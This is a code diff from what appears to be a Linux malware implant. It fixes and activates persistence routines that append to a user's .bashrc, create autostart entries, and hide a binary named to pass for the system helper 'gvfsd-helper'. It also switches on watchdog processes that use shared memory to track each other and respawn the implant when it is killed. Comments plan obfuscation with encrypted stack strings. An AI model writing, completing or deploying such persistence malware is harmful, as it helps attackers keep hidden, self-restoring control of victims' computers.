@@ -37,12 +37,12 @@ bool nonroot_bashrc_persistence() {
 
     int fpath_size = strlen(HOME) + strlen(bashrc);
     char *fpath = (char *)malloc(fpath_size);
-
+    memset(fpath, 0, fpath_size);
     strncat(fpath, HOME, strlen(HOME));
     strncat(fpath, bashrc, strlen(bashrc));
 
     // TODO: decrypt and rotate char array for stack string to then execute write_to_file
-    int fd = open(fpath, O_WRONLY | O_APPEND | O_CREAT , 0755);
+    int fd = open(fpath, O_CREAT| O_WRONLY| O_APPEND , 0755);
     if (fd < 0) {
         return false;
     }
@@ -80,7 +80,7 @@ bool nonroot_desktop_persistence() {
 
     int fpath_size = strlen(HOME) + strlen(gnomehelper_path);
     char *fpath = (char *)malloc(fpath_size);
-
+    memset(fpath, 0, fpath_size);
     strncat(fpath, HOME, strlen(HOME));
     strncat(fpath, gnomehelper_path, strlen(gnomehelper_path));
 
@@ -88,6 +88,7 @@ bool nonroot_desktop_persistence() {
     char *audir = "/.config/au-tostart";
     int dirpath_size = strlen(HOME) + strlen(audir);
     char *dirpath = (char *)malloc(dirpath_size);
+    memset(dirpath, 0, dirpath_size);
     strncat(dirpath, HOME, strlen(HOME));
     strncat(dirpath, audir, strlen(audir));
     if (access(dirpath, F_OK) == -1) {
@@ -106,7 +107,7 @@ bool nonroot_desktop_persistence() {
     char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
     fpath_size = strlen(HOME) + strlen(gvfsd_helper);
     char *binpath = (char *)malloc(fpath_size);
-
+    memset(binpath, 0, fpath_size);
     strncat(binpath, HOME, strlen(HOME));
     strncat(binpath, gvfsd_helper, strlen(gvfsd_helper));
 
@@ -225,21 +226,21 @@ bool root_persistence(void) {
 }
 
 
-bool monitor_proc(int pid) {
+bool monitor_proc(char *pid) {
 
     char *procpath = "/proc/";
-    char *tmppid = malloc(sizeof(pid));
-    sprintf(tmppid, "%d", pid); //tmppid == pid
 
-    int size_procpath = strlen(procpath) + strlen(tmppid);
+    int size_procpath = strlen(procpath) + strlen(pid);
     char *finalpath = (char *)malloc(size_procpath);
+    memset(finalpath, 0, size_procpath);
 
     strncpy(finalpath, procpath, strlen(procpath));
-    strncat(finalpath, tmppid, strlen(tmppid));
+    strncat(finalpath, pid, strlen(pid));
     // variable finalpath is now /proc/<PID>
 
-    free(tmppid);
     int res = access(finalpath, F_OK);
+    //free(pid);
+    free(finalpath);
     if (res == 0 ) {
         return true; // file exists
     } else {
@@ -287,29 +288,28 @@ void watchdog_process_shmget(char *fpath){
         fprintf(stderr, "\n[wathcdog_process_shmget] Error getting shared memory : %s\n", strerror(errno));
             //execvp(fpath, NULL);
     }
-    void *addr = shmat(shmid, NULL, 0);
-
 
     // write PID to sharedmem
+    void *addr = shmat(shmid, NULL, 0);
     memcpy(addr, c_pid, 8);
     sleep(10);
-
     // TODO - stackstring + AES + ROR here
-
+    //
     do {
 
         //  check /proc/<PID> exists....
-        proc_alive = monitor_proc(pid);
+        // get pid from shared memory.
+        char *shmem_pid_addr = shmat(shmid, NULL, 0);
+        proc_alive = monitor_proc(shmem_pid_addr);
 
         //if proc not there, exec into existence
         if (proc_alive == false) {
-            fprintf(stderr, "process is not alive! spawning");
+            fprintf(stderr, "[shmget] process is not alive! spawning\n");
             //execvp(fpath, NULL);
         }
 
         sleep(3);
     } while(true);
-
 
     if (fpath != NULL) {
         free(fpath);
@@ -327,25 +327,22 @@ void watchdog_process_shmread(char *fpath) {
     do {
         int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
         if (shmid <= 0) {
-            fprintf(stderr, "\n[wathcdog_process_shmread] Error reading shared memory : %s\n", strerror(errno));
-            //execvp(fpath, NULL);
+            fprintf(stderr, "\n[wathcdog_process_shmread] %s\n", strerror(errno));
+            execvp(fpath, NULL);
         }
 
         // get pid from shared memory.
-        int *addr = shmat(shmid, NULL, 0);
-        int *c_pid = (char *)malloc(sizeof(int));
-        sprintf(c_pid, "%d",  addr);
+        char *shmem_pid_addr = shmat(shmid, NULL, 0);
+        proc_alive = monitor_proc(shmem_pid_addr);
 
-        proc_alive = monitor_proc(*c_pid);
-
-        //if proc not there, exec into existence
+        //if proc pid entry not there, exec into existence
         if (proc_alive == false) {
-            fprintf(stderr, "process is not alive! spawning");
-            //execvp(fpath, NULL);
+            fprintf(stderr, "[shmread] process is not alive! spawning\n");
+            execvp(fpath, NULL);
         }
         // if process dies execute
         if (!access(fpath, F_OK)) {
-            //execvp(fpath, NULL);
+            execvp(fpath, NULL);
         }
 
         sleep(3);
